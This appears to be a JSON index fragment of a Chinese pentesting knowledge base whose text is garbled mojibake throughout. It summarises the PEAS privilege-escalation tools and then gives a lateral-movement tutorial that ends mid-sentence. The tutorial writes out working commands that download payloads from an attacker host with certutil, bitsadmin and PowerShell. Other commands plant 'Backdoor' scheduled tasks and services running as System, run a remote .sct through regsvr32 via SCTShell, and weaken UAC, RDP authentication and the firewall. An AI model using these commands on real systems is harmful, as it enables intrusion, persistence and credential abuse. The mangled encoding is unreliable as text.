netmask=\u0026#34;\u0026#34;\u0026gt;ä½¿ç”¨fpingæˆ–pingå‘ç°ä¸»æœºã€‚\u0026lt;/ip\u0026gt;ä¾‹: -d 192.168.0.1/24 -p \u0026lt;PORT(s)\u0026gt; -d \u0026lt;IP/NETMASK\u0026gt; å‘ç°å¯»æ‰¾TCPå¼€æ”¾ç«¯å£çš„ä¸»æœº(é€šè¿‡nc)ã€‚é»˜è®¤ç«¯å£22ã€80,443,445ã€3389å’Œæ‚¨æŒ‡å®šçš„å¦ä¸€ä¸ªç«¯å£å°†è¢«æ‰«æ(å¦‚æœæ‚¨ä¸æƒ³æ·»åŠ æ›´å¤šç«¯å£ï¼Œè¯·é€‰æ‹©22)ã€‚æ‚¨ä¹Ÿå¯ä»¥æ·»åŠ ç«¯å£åˆ—è¡¨ã€‚ä¾‹å¦‚:-d 192.168.0.1/24 -p 53,139 -i \u0026lt;IP\u0026gt; [-p \u0026lt;PORT(s)\u0026gt;] ä½¿ç”¨ncæ‰«æIPã€‚é»˜è®¤æƒ…å†µä¸‹(æ²¡æœ‰-p)ï¼Œå°†æ‰«ænmapçš„top1000ï¼Œä½†æ‚¨ä¹Ÿå¯ä»¥é€‰æ‹©ä¸€ä¸ªç«¯å£åˆ—è¡¨ã€‚ä¾‹å¦‚:-i 127.0.0.1 -p 53,80,443,8000,8080 -t è‡ªåŠ¨ç½‘ç»œæ‰«æ(ä¸»æœºå‘ç°å’Œç«¯å£æ‰«æ)-æ­¤é€‰é¡¹å†™å…¥æ–‡ä»¶ æ³¨æ„ï¼Œå¦‚æœæŒ‡å®šä¸€äº›ç½‘ç»œæ‰«æ(options -d/-p/-iï¼Œä½†NOT -t)ï¼Œå°†ä¸ä¼šæ‰§è¡ŒPEæ£€æŸ¥ ",
        "summary": "æƒé™æå‡-PEASä½¿ç”¨ ä¸€ä¸ªç‰›é€¼çš„é’ˆå¯¹æƒé™æå‡çš„å·¥å…·ï¼Œé€‚ç”¨äºWindows/linux/unix*/macOSææƒ\nè¿™äº›å·¥å…·æœç´¢å¯èƒ½çš„æœ¬åœ°æƒé™æå‡è·¯å¾„ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™äº›è·¯å¾„å¹¶å°†å®ƒä»¬ä»¥æ¼‚äº®çš„é¢œè‰²æ‰“å°ç»™æ‚¨ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥è½»æ¾è¯†åˆ«é”™è¯¯é…ç½®\nè¿™é‡Œå¯¹å…¶è¿›è¡Œç®€å•ä»‹ç»ï¼Œè¯¦ç»†ä½¿ç”¨è¯·å‰å¾€githubåœ°å€ï¼šhttps://github.com/carlospolop/PEASS-ng/\nWinPEAS ä»‹ç» ç›´æ¥å‘½ä»¤è¡Œæ‰§è¡Œå³å¯ï¼š\nwinPEASany.exe è¿è¡Œwinpeasèƒ½æœç´¢æ‰€æœ‰å¯èƒ½çš„ææƒè·¯å¾„ï¼Œæ£€æŸ¥çš„ä¿¡æ¯å¦‚ä¸‹\nç³»ç»Ÿä¿¡æ¯ åŸºæœ¬ç³»ç»Ÿä¿¡æ¯ ä½¿ç”¨ Watson æœç´¢æ¼æ´ æšä¸¾ Microsoft æ›´æ–°ä¿¡æ¯ PSã€å®¡è®¡ã€WEF å’Œ LAPS è®¾ç½® LSA ä¿æŠ¤ å‡­æ®ä¿æŠ¤ WDigest ç¼“å­˜çš„ä¿¡ç”¨æ•°é‡ ç¯å¢ƒå˜é‡ äº’è”ç½‘è®¾ç½® å½“å‰é©±åŠ¨å™¨ä¿¡æ¯ æ€æ¯’è½¯ä»¶ Windows Defender UAC é…ç½® NTLM è®¾ç½® æœ¬åœ°ç»„ç­–ç•¥ Applocker é…ç½®å’Œç»•è¿‡å»ºè®® æ‰“å°æœº å‘½åç®¡é“ AMSI ä¾›åº”å•† ç³»ç»Ÿç›‘è§†å™¨ .NET ç‰ˆæœ¬ ç”¨æˆ·ä¿¡æ¯ ç”¨æˆ·ä¿¡æ¯ å½“å‰ä»¤ç‰Œç‰¹æƒ å‰ªè´´æ¿æ–‡æœ¬ å½“å‰ç™»å½•çš„ç”¨æˆ· RDP ä¼šè¯ æ›¾ç»ç™»å½•è¿‡çš„ç”¨æˆ· è‡ªåŠ¨ç™»å½•å‡­æ® ä¸»æ–‡ä»¶å¤¹ å¯†ç ç­–ç•¥ æœ¬åœ°ç”¨æˆ·è¯¦ç»†ä¿¡æ¯ ç™»å½•ä¼šè¯ è¿›ç¨‹ä¿¡æ¯ æœ‰è¶£çš„è¿›ç¨‹ï¼ˆéå¾®è½¯ï¼‰ æœåŠ¡ä¿¡æ¯ æœ‰è¶£çš„æœåŠ¡ï¼ˆé Microsoftï¼‰ä¿¡æ¯ å¯ä¿®æ”¹çš„æœåŠ¡ å¯å†™æœåŠ¡æ³¨å†Œè¡¨binpath PATH DLLåŠ«æŒ åº”ç”¨ä¿¡æ¯ å½“å‰æ´»åŠ¨çª—å£ å®‰è£…çš„è½¯ä»¶ è‡ªåŠ¨è¿è¡Œ è®¡åˆ’ä»»åŠ¡ è®¾å¤‡é©±åŠ¨ç¨‹åº ç½‘ç»œä¿¡æ¯ å½“å‰net share æ˜ å°„é©±åŠ¨å™¨ (WMI) ä¸»æœºæ–‡ä»¶ ç½‘ç»œæ¥å£ ç›‘å¬ç«¯å£ é˜²ç«å¢™è§„åˆ™ DNS ç¼“å­˜ï¼ˆé™åˆ¶ 70ï¼‰ äº’è”ç½‘è®¾ç½® Windows å‡­æ® Windows ä¿é™©åº“ å‡­è¯ç®¡ç†å™¨ ä¿å­˜çš„ RDP è®¾ç½® æœ€è¿‘è¿è¡Œçš„å‘½ä»¤ é»˜è®¤ PS æˆç»©å•æ–‡ä»¶ DPAPI ä¸‡èƒ½å¯†é’¥ DPAPI å‡­æ®æ–‡ä»¶ è¿œç¨‹æ¡Œé¢è¿æ¥ç®¡ç†å™¨å‡­æ® Kerberos é—¨ç¥¨ æ— çº¿ä¸Šç½‘ AppCmd.exe SSClient.exe SCCM å®‰å…¨åŒ…å‡­è¯ AlwaysInstallElevated WSUS æµè§ˆå™¨ä¿¡æ¯ Firefox æ•°æ®åº“ Firefox å†å²ä¸Šçš„å‡­æ® Chrome æ•°æ®åº“ chrome å†å²ä¸Šçš„å‡­æ® å½“å‰çš„ IE é€‰é¡¹å¡ IEå†å²ä¸Šçš„å‡­æ® IE æ”¶è—å¤¹ æå–å·²ä¿å­˜çš„å¯†ç ï¼šFirefoxã€Chromeã€Operaã€Brave æœ‰è¶£çš„æ–‡ä»¶å’Œæ³¨å†Œè¡¨ Puttyä¼šè¯ Putty SSH ä¸»æœºå¯†é’¥ SuperPuttyä¿¡æ¯ OneDrive åŒæ­¥çš„ Office365 ç«¯ç‚¹ æ³¨å†Œè¡¨ä¸­çš„ SSH å¯†é’¥ äº‘å‡­è¯ æ£€æŸ¥æ— äººå‚ä¸çš„æ–‡ä»¶ æ£€æŸ¥ SAM å’Œ SYSTEM å¤‡ä»½ æ£€æŸ¥ç¼“å­˜çš„ GPP å¯†ç  ä» McAffe SiteList.xml æ–‡ä»¶ä¸­æ£€æŸ¥å¹¶æå–å‡­æ® å¯èƒ½çš„å…·æœ‰å‡­æ®çš„æ³¨å†Œè¡¨ ç”¨æˆ·å®¶ä¸­å¯èƒ½çš„å‡­æ®æ–‡ä»¶ å›æ”¶ç«™ä¸­å¯èƒ½å­˜åœ¨çš„å¯†ç æ–‡ä»¶ å¯èƒ½åŒ…å«å‡­æ®çš„æ–‡ä»¶ï¼ˆè¿™éœ€è¦å‡ åˆ†é’Ÿï¼‰ ç”¨æˆ·æ–‡ä»¶ï¼ˆé™åˆ¶ 100 ä¸ªï¼‰ Oracle SQL Developer é…ç½®æ–‡ä»¶æ£€æŸ¥ Slackæ–‡ä»¶æœç´¢ Outlook ä¸‹è½½ æœºå™¨å’Œç”¨æˆ·è¯ä¹¦æ–‡ä»¶ Officeæœ€è¿‘çš„æ–‡ä»¶ éšè—çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ å…·æœ‰å†™å…¥æƒé™çš„éé»˜è®¤æ–‡ä»¶å¤¹ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ WSL æ£€æŸ¥ æ´»åŠ¨ä¿¡æ¯ ç™»å½• + æ˜¾å¼ç™»å½•äº‹ä»¶ æµç¨‹åˆ›å»ºäº‹ä»¶ PowerShell äº‹ä»¶ ç”µæºå¼€/å…³äº‹ä»¶ é™„åŠ ï¼ˆè¾ƒæ…¢ï¼‰æ£€æŸ¥ LOLBAS æœç´¢ åœ¨é»˜è®¤ WSL åˆ†å‘ä¸­è¿è¡Œ**linpeas.sh** å‚æ•°è®¾ç½® -hå¯ä»¥æŸ¥çœ‹æ‰€æœ‰å‚æ•°ï¼š\n"
    }
,
    {
        "title": "æ¨ªå‘ç§»åŠ¨å§¿åŠ¿åˆé›†",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF%E5%90%88%E9%9B%86/",
        "content": "æ¨ªå‘ç§»åŠ¨å§¿åŠ¿åˆé›† æ¨ªå‘ç§»åŠ¨å§¿åŠ¿æµ…æ æ¨ªå‘ç§»åŠ¨ä¸­çš„æ–‡ä»¶ä¼ è¾“ æ¨ªå‘ç§»åŠ¨ä¹‹å‰ï¼Œéœ€è¦å¯¹æ”»å‡»è½½è·å’Œæ–‡ä»¶ç­‰çš„ä¼ è¾“åˆ¶å®šæ–¹æ¡ˆï¼ˆå½“ç„¶ï¼Œä½ ä½¿ç”¨c2çš„è¯å½“æˆ‘æ²¡è¯´ï¼‰\né€šè¿‡ç½‘ç»œå…±äº« å¯ä»¥å®ç°å±€åŸŸç½‘ä¹‹é—´çš„ç½‘ç»œå…±äº«ï¼Œé€šè¿‡æä¾›æœ‰æ•ˆçš„ç”¨æˆ·å‡­æ®ï¼Œç”¨æˆ·å¯ä»¥å®ç°ä¸¤å°ä¸»æœºä¹‹é—´çš„æ–‡ä»¶ä¼ è¾“\nè·å–windowsé»˜è®¤å¼€å¯çš„ç½‘ç»œå…±äº«ï¼š\nnet share C$ä¸ºCç›˜å…±äº«ï¼ŒADMIN$ä¸ºç³»ç»Ÿç›®å½•å…±äº«ï¼ŒIPC$å…±äº«éœ€è¦æä¾›å¯ä¿¡ä»»çš„ç”¨æˆ·åå’Œå£ä»¤æ¥å»ºç«‹å®‰å…¨çš„ä¼ è¾“é€šé“\nå®æˆ˜é€šå¸¸é€‰æ‹©IPCè¿æ¥ï¼Œè¯¥æ–¹æ³•é™¤äº†æ–‡ä»¶å…±äº«è¿˜èƒ½å®ç°åˆ›å»ºè®¡åˆ’ä»»åŠ¡æˆ–ç³»ç»ŸæœåŠ¡ç­‰ï¼Œè€Œå»ºç«‹IPCè¿æ¥çš„å‰ææ˜¯ï¼š\nè¿œç¨‹ä¸»æœºå¼€å¯äº†IPCè¿æ¥ è¿œç¨‹ä¸»æœº139æˆ–445ç«¯å£å¼€æ”¾ å»ºç«‹IPCè¿æ¥ï¼š\nnet use \\\\192.168.111.131\\IPC$ \u0026#34;Admin123456\u0026#34; /user:\u0026#34;yuy0ung\\administrator\u0026#34; åˆ—å‡ºè¿œç¨‹ä¸»æœºCç›˜å…±äº«æ–‡ä»¶ï¼š\ndir \\\\192.168.111.131\\C$ ä½¿ç”¨copyå¯ä»¥åœ¨ä¸¤å°ä¸»æœºä¹‹é—´ç›¸äº’å¤åˆ¶æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘å‘ç›®æ ‡ä¸»æœºä¸Šä¼ è¿œæ§exeï¼š\ncopy artifact.exe \\\\192.168.111.131\\C$ å»ºç«‹å…¶ä»–å…±äº«è¿æ¥å‘½ä»¤ç±»ä¼¼å¦‚C$è¿æ¥ï¼š\nnet use \\\\192.168.111.131\\C$ \u0026#34;Admin123456\u0026#34; /user:\u0026#34;yuy0ung\\Administrator\u0026#34; æ­å»ºSMBæœåŠ¡å™¨ å¯ä»¥å°è¯•åœ¨å…¬ç½‘vpsæˆ–å—æ§å†…ç½‘ä¸»æœºä¸Šæ­å»ºSMBæœåŠ¡å™¨ï¼Œå°†éœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ”¾å…¥SMBæœåŠ¡å™¨çš„å…±äº«ç›®å½•å¹¶æŒ‡å®šUNCè·¯å¾„ï¼Œè®©æ¨ªå‘ç§»åŠ¨çš„ä¸»æœºèƒ½å¤Ÿè¿œç¨‹åŠ è½½å…±äº«æ–‡ä»¶ï¼Œæœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ï¼š\nè¦ä½¿ç”¨SMBåŒ¿åå…±äº« è¯¥SMBæœåŠ¡å™¨èƒ½å¤Ÿè¢«ç›®æ ‡ä¸»æœºè®¿é—® åœ¨linuxç³»ç»Ÿä¸Šå¯ä»¥é€šè¿‡impacketé¡¹ç›®ä¸­çš„smbserver.pyæ­å»ºSMBæœåŠ¡å™¨\næ­å»ºä¸€ä¸ªåä¸ºyuy0ungsmbï¼Œå…±äº«ç›®å½•æŒ‡å‘/root/shareçš„SMBåŒ¿åå…±äº«ï¼š\nmkdir /root/share python smbserver.py yuy0ungsmb /root/share -smb2support # æˆ–è€… impacket-smbserver evilsmb /root/share -smb2support ä» SMB server ä¸‹è½½æ–‡ä»¶\ncopy \\\\192.168.111.128\\yuy0ungsmb\\file.exe file.exe ä¸Šä¼ æ–‡ä»¶åˆ° SMB server\nnet use x: \\\\192.168.111.128\\yuy0ungsmb copy file.txt x: net use x: /delete ä½¿ç”¨ windowsè‡ªå¸¦å·¥å…· Certutil certutilç”¨äºç®¡ç†windowsè¯ä¹¦å¹¶ä½œä¸ºè¯ä¹¦æœåŠ¡çš„ä¸€éƒ¨åˆ†å®‰è£…ï¼Œå…¶æä¾›äº†ä»ç½‘ç»œä¸­ä¸‹è½½æ–‡ä»¶çš„åŠŸèƒ½ï¼š\ncertutil -urlcache -split -f http://192.168.111.1/payload.exe C:\\shell.exe ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘è¿™é‡Œä¼šæŠ¥é”™æ˜¾ç¤ºæ‹’ç»è®¿é—®\nBITSAdmin win7ä»¥åç‰ˆæœ¬ç³»ç»Ÿè‡ªå¸¦\nåˆ›å»ºä¸€ä¸ªåä¸ºtestçš„ä»»åŠ¡ï¼Œä¸‹è½½payload.exeåˆ°æœ¬åœ°ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°C:\\shell.exeï¼š\nbitsadmin /transfer test http://192.168.111.1/payload.exe C:\\shell.exe powershell powershellä¹Ÿå¯ä»¥å®ç°æ–‡ä»¶ä¸‹è½½ï¼š\nInvoke-WebRequest -Uri http://192.168.111.1/payload.exe -OutFile C:\\shell.exe å‘½ä»¤å¾ˆå¤šï¼Œè‡ªå·±é€‰æ‹©å³å¯ï¼Œè¿™é‡Œä¹Ÿåªåˆ—å‡ºäº†å‡ æ¡\nåˆ›å»ºè®¡åˆ’ä»»åŠ¡ å¸¸è§„åˆ©ç”¨æµç¨‹ åœ¨æ‹¥æœ‰å¯¹æ–¹ç®¡ç†å‘˜å‡­æ®çš„æ¡ä»¶ä¸‹ï¼Œå¯ä»¥é€šè¿‡å·²æœ‰çš„IPCè¿æ¥ï¼Œåœ¨è¿œç¨‹ä¸»æœºåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œå®ç°æ¨ªå‘ç§»åŠ¨ï¼Œæµç¨‹å¦‚ä¸‹\nåˆ©ç”¨å·²å»ºç«‹çš„å…±äº«è¿æ¥ä¸Šä¼ è¿œæ§exe\nåˆ©ç”¨IPCè¿æ¥åˆ›å»ºè®¡åˆ’ä»»åŠ¡è¿è¡Œè¿œæ§exeï¼š\nschtasks /Create /S 192.168.111.131 /TN Backdoor /SC minute /MO 1 /TR C:\\shell.exe /RU System /F /U yuy0ung\\administrator /P Admin123456 # /sï¼ŒæŒ‡å®šè¦è¿æ¥åˆ°çš„ç³»ç»Ÿ # /TNï¼ŒæŒ‡å®šè¦åˆ›å»ºçš„è®¡åˆ’ä»»åŠ¡åç§° # /SCï¼ŒæŒ‡å®šè®¡åˆ’ä»»åŠ¡é¢‘ç‡ # /MOï¼Œåˆ¶å®šè®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘¨æœŸ # /TRï¼ŒæŒ‡å®šè®¡åˆ’ä»»åŠ¡è¿è¡Œçš„ç¨‹åºè·¯å¾„ # /RUï¼ŒæŒ‡å®šè®¡åˆ’ä»»åŠ¡è¿è¡Œçš„ç”¨æˆ·æƒé™ # /Fï¼Œå¦‚æœæŒ‡å®šçš„ä»»åŠ¡å­˜åœ¨åˆ™å¼ºåˆ¶åˆ›å»º æ£€æŸ¥æ˜¯å¦æ·»åŠ æˆåŠŸï¼š\nschtasks /Query /S 192.168.111.131 /U yuy0ung\\administrator /P Admin123456 | findstr \u0026#34;Backdoor\u0026#34; ç«‹å³å¯åŠ¨è®¡åˆ’ä»»åŠ¡ï¼š\nschtasks /RUN /S 192.168.111.131 /I /TN Backdoor /U yuy0ung\\administrator /P Admin123456 å¼€å¯ç›‘å¬å³å¯è¿æ¥è¿œæ§ï¼š\nåˆ é™¤è®¡åˆ’ä»»åŠ¡ï¼š\nschtasks /Delete /S 192.168.111.131 /TN Backdoor /F /U yuy0ung\\administrator /P Admin123456 UNCè·¯å¾„åŠ è½½æ‰§è¡Œ windowsç³»ç»Ÿä¸­ä½¿ç”¨UNCè·¯å¾„æ¥è®¿é—®ç½‘ç»œå…±äº«èµ„æºï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\n\\\\servername\\share\\directory\\filename å…¶ä¸­ï¼Œservernameæ˜¯æœåŠ¡å™¨ä¸»æœºåï¼Œsharenameæ˜¯ç½‘ç»œå…±äº«çš„åç§°ï¼Œdirectoryå’Œfilenameåˆ†åˆ«ä¸ºè¯¥å…±äº«ä¸‹çš„ç›®å½•å…±å’Œæ–‡ä»¶\nä½¿ç”¨UNCè·¯å¾„ä»£æ›¿å¸¸è§„çš„æœ¬åœ°è·¯å¾„ï¼Œè®©è¿œç¨‹ä¸»æœºç›´æ¥åœ¨vpsä¸Šæ­å»ºçš„smbå…±äº«ä¸­åŠ è½½æ”»å‡»è½½è·å¹¶æ‰§è¡Œï¼Œå¯ä»¥çœå»æ‰‹åŠ¨ä¸Šä¼ çš„æ­¥éª¤ï¼Œä¾‹å¦‚è¿™é‡Œå»ºç«‹è¿æ¥åç»™è¿œç¨‹ä¸»æœºæ·»åŠ å®šæ—¶ä»»åŠ¡åŠ è½½è¿œæ§exeï¼ˆpsexecã€wmicã€dcomåŒç†ï¼‰ï¼š\nèµ·ä¸€ä¸ªsmbserver:\nåœ¨è¿œç¨‹ä¸»æœºåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œä½¿ç”¨UNCè·¯å¾„åŠ è½½smbå…±äº«çš„exeå¹¶æ‰§è¡Œï¼š\nschtasks /Create /S 192.168.111.137 /TN Backdoor /SC minute /MO 1 /TR \\\\192.168.205.151\\evilsmb\\payload.exe /RU System /F /U yuy0ung\\administrator /P Admin123456 smbåŠ è½½æ–‡ä»¶ï¼š\nmsfç›‘å¬ä¸Šçº¿ï¼š\nåˆ©ç”¨ç³»ç»ŸæœåŠ¡ åˆ›å»ºè¿œç¨‹æœåŠ¡ é€šè¿‡åˆ›å»ºç³»ç»ŸæœåŠ¡ï¼Œåœ¨è¿œç¨‹ä¸»æœºä¸Šè¿è¡ŒæŒ‡å®šçš„ç¨‹åºæˆ–å‘½ä»¤ï¼Œéœ€è¦æ‹¥æœ‰ä¸¤ç«¯ä¸»æœºçš„ç®¡ç†å‘˜æƒé™å’ŒIPCè¿æ¥ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\nåˆ©ç”¨å·²å»ºç«‹çš„å…±äº«è¿æ¥å‘è¿œç¨‹ä¸»æœºä¸Šä¼ æ¶æ„æ–‡ä»¶\nåˆ©ç”¨å»ºç«‹çš„IPCè¿æ¥åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºç³»ç»ŸæœåŠ¡ï¼š\nsc \\\\192.168.111.137 create Backdoor binpath= \u0026#34;cmd.exe /k C:\\payload.exe\u0026#34; å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹ï¼š\nå¯åŠ¨æœåŠ¡ï¼š\nsc \\\\192.168.111.137 start Backdoor ä¼šæç¤ºé”™è¯¯ä½†ä¾ç„¶æˆåŠŸä¸Šçº¿ï¼š\næ”»å‡»ç»“æŸååˆ é™¤æœåŠ¡ï¼š\nsc \\\\192.168.111.137 delete Backdoor SCShell ä¸€æ¬¾æ— æ–‡ä»¶æ¨ªå‘ç§»åŠ¨å·¥å…·ï¼šMr-Un1k0d3r/SCShell: Fileless lateral movement tool that relies on ChangeServiceConfigA to run command\nä½¿ç”¨æ—¶éœ€è¦æä¾›è¿œç¨‹ä¸»æœºç®¡ç†å‘˜çš„ç”¨æˆ·å‡­æ®ï¼Œå¹¶ä¸”éœ€è¦å·²çŸ¥è¿œç¨‹ä¸»æœºä¸Šçš„ç³»ç»ŸæœåŠ¡åç§°\nè¿™é‡Œä»¥é€šè¿‡regsvr32æ‰§è¡Œå¤–éƒ¨SCTæ–‡ä»¶çš„æ–¹å¼ä¸Šçº¿è¿œç¨‹ä¸»æœºï¼š\nmsfå¯åŠ¨ä¸€ä¸ªweb deliveryï¼Œç”Ÿæˆç”¨äºregsvr32æ‰§è¡Œçš„payloadï¼š é€šè¿‡SCShellåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œç”Ÿæˆçš„payloadï¼š\nSCShell.exe 192.168.111.137 XblAuthManager \u0026#34;C:\\windows\\system32\\cmd.exe /c C:\\windows\\system32\\regsvr32 /s /n /u /i:http://192.168.205.151:8080/j489QXQfibPzj3E.sct scrobj.dll\u0026#34; yuy0ung.com administrator Admin123456 æˆåŠŸä¸Šçº¿msfï¼š\nSharoNoPSExecçš„åˆ©ç”¨æ€è·¯ä¸æ­¤ç›¸ä¼¼ï¼Œä¹Ÿå¯ä»¥çœ‹çœ‹\nUAC Remote Restrictions UACï¼ˆç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼‰ä½¿è®¡ç®—æœºç”¨æˆ·èƒ½å¤Ÿä»¥éç®¡ç†å‘˜èº«ä»½æ‰§è¡Œæ—¥å¸¸ä»»åŠ¡ã€‚å½“ç”¨æˆ·ä»¥æœ¬åœ°ç”¨æˆ·è¿œç¨‹è¿è¡Œéœ€è¦ç®¡ç†å‘˜ç”¨æˆ·çš„ç¨‹åºï¼Œéƒ½åªèƒ½ä½¿ç”¨æœ¬åœ°ç”¨æˆ·ä¸­RIDä¸º500(Adminitrator)çš„ç®¡ç†å‘˜ç”¨æˆ·æ¥è¿è¡Œ\nå¦‚æœæµ‹è¯•äººå‘˜è¿›è¡Œéœ€è¦ç®¡ç†å‘˜æƒé™çš„è¿œç¨‹ç®¡ç†æ“ä½œï¼ˆschtaskã€psexecã€wmiã€winRMã€PTH\u0026hellip;\u0026hellip;ï¼‰ï¼Œé™¤äº†åŸŸç®¡ç†å‘˜ç”¨æˆ·ï¼Œå…¶ä»–ä»»ä½•ç”¨æˆ·åŒ…æ‹¬éRID500çš„ç®¡ç†å‘˜ç”¨æˆ·éƒ½ä¼šæç¤ºâ€œæ‹’ç»è®¿é—®â€\néœ€è¦æ³¨æ„çš„æ˜¯è¯¥é™åˆ¶å¯¹åŸŸç®¡ç”¨æˆ·æ— æ•ˆï¼Œåªé™åˆ¶æœ¬åœ°ç”¨æˆ·\né‡å¯ç³»ç»Ÿå…³é—­UAC(æˆ–è®¸èƒ½æˆï¼Œä½†æ˜¯å†™å…¥çš„æœåŠ¡æ²¡æœ‰åŒå¼•å·æŒ‡å®šè·¯å¾„)\nreg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\u0026#34; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f è¿œç¨‹æ¡Œé¢åˆ©ç”¨ å³RDPï¼Œé»˜è®¤TCP 3389ç«¯å£\nå¯ä»¥é€šè¿‡è·å–å‡­æ®ï¼ŒRDPè¿æ¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œç¼ºç‚¹æ˜¯å¯èƒ½å°†å·²ç™»é™†çš„ç”¨æˆ·å¼ºåˆ¶é€€å‡ºï¼Œå®¹æ˜“è¢«ç®¡ç†å‘˜å‘ç°\nè¿œç¨‹æ¡Œé¢çš„ç¡®å®šå¼€å¯ æŸ¥è¯¢æ³¨å†Œè¡¨ç¡®å®šä¸»æœºæ˜¯å¦å¼€å¯äº†è¿œç¨‹æ¡Œé¢ï¼š\nreg query \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections è‹¥å­—æ®µå€¼ä¸º0x0è¯´æ˜RDPæœåŠ¡å·²å¯åŠ¨ï¼›è‹¥ä¸º0x1ï¼Œåˆ™è¯´æ˜RDPæœåŠ¡ç¦ç”¨\ncmdå‘½ä»¤å¼€å¯è¿œç¨‹æ¡Œé¢ï¼š\n#å¼€å¯æœåŠ¡ reg add \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f #å…³é—­â€œä»…å…è®¸è¿è¡Œä½¿ç”¨ç½‘ç»œçº§åˆ«èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢è®¡ç®—æœºè¿æ¥â€(é‰´æƒ) reg add \u0026#34;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\u0026#34; /v UserAuthentication /t REG_DWORD /d 0 #è®¾ç½®é˜²ç«å¢™ç­–ç•¥æ”¾è¡Œ3389ç«¯å£ netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow å¯¹è¿œç¨‹ä¸»æœºï¼Œå¯ä½¿ç”¨WMIæ¥å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼ˆè¦æŒ‡å®šè¿œç¨‹ä¸»æœºçš„IPã€ä¸»æœºåå’Œç”¨æˆ·å‡­æ®ï¼‰ï¼š\nwmic /Node:192.168.111.137 /User:yuy0ung\\administrator /Password:Admin123456 RDTOGGLE WHERE ServerName=\u0026#34;client01\u0026#34; call SetAllowTSConnections 1 RDP Hijacking å¯¹äºå¼€å¯è¿œç¨‹æ¡Œé¢çš„windowsä¸»æœºï¼Œå½“å¤šä¸ªç”¨æˆ·è¿›è¡Œç™»å½•æ—¶ï¼Œä¼šäº§ç”Ÿå¤šä¸ªä¼šè¯ã€‚è‹¥è·å–äº†systemæƒé™ï¼Œåˆ™å¯ä»¥åŠ«æŒå…¶ä»–ç”¨æˆ·çš„RDPä¼šè¯ï¼Œå¹¶åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æˆåŠŸç™»å…¥ç›®æ ‡ç³»ç»Ÿï¼ˆå³ä½¿è¯¥ç”¨æˆ·çš„ä¼šè¯å·²æ–­å¼€ï¼‰ï¼Œå³è¿œç¨‹æ¡Œé¢åŠ«æŒ\nRDP Hijackingéœ€è¦è·å–systemæƒé™å¹¶æ‰§è¡Œtsonå‘½ä»¤\nè¯¥å‘½ä»¤å¯ä»¥åˆ‡æ¢ä¼šè¯ï¼Œsystemæƒé™ä¸‹å¯ä¸è¾“å…¥å¯†ç åˆ‡æ¢ä¼šè¯ï¼Œé€ æˆåŠ«æŒï¼š\nrdpç™»å½•ç”¨æˆ·apacheï¼š\nè·å–systemæƒé™ï¼š\næŸ¥çœ‹ç”¨æˆ·ä¼šè¯è®°å½•ï¼š\nquery user å‘ç°administratorå’Œapacheç”¨æˆ·çš„ä¼šè¯\nå°è¯•åˆ‡æ¢ä¸ºadministratorï¼š\ntscon 1 è¿™é‡ŒæŒ‰é“ç†æ¥è¯´rdpåº”è¯¥ä¼šåˆ‡æ¢åˆ°administratorï¼Œä½†è¿™é‡Œæ˜¾ç¤ºaccess is deniedï¼Œä¸çŸ¥é“åŸå› ï¼Œæˆ‘éƒ½å·²ç»systemæƒé™äº†ã€‚ã€‚ã€‚ã€‚\nSharpRDP é€šè¿‡è¿œç¨‹æ¡Œé¢åè®®åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä¸”æ— éœ€GUI\nä¼˜ç‚¹ï¼šåœ¨è¿œæ§å†…ç½‘ä¸»æœºæ—¶æ— éœ€åšä»£ç†ï¼Œå°†å·¥å…·ä¸Šä¼ è‡³è·³æ¿æœºå³å¯å®ç°å¯¹å†…ç½‘ä¸»æœºçš„å‘½ä»¤æ‰§è¡Œ\nPsExecè¿œç¨‹æ§åˆ¶ psexecæ˜¯å¾®è½¯å®˜æ–¹æä¾›çš„è¿œæ§å·¥å…·ï¼Œä½¿ç”¨ä¸éœ€è¦å¯¹æ–¹ä¸»æœºå¼€æ–¹3389ç«¯å£ï¼Œ\nåªéœ€è¦å¯¹æ–¹å¼€å¯admin$å…±äº«å’Œipc$ (è¯¥å…±äº«é»˜è®¤å¼€å¯ï¼Œä¾èµ–äº445ç«¯å£)ã€‚ä½†æ˜¯ï¼Œå‡å¦‚ç›®æ 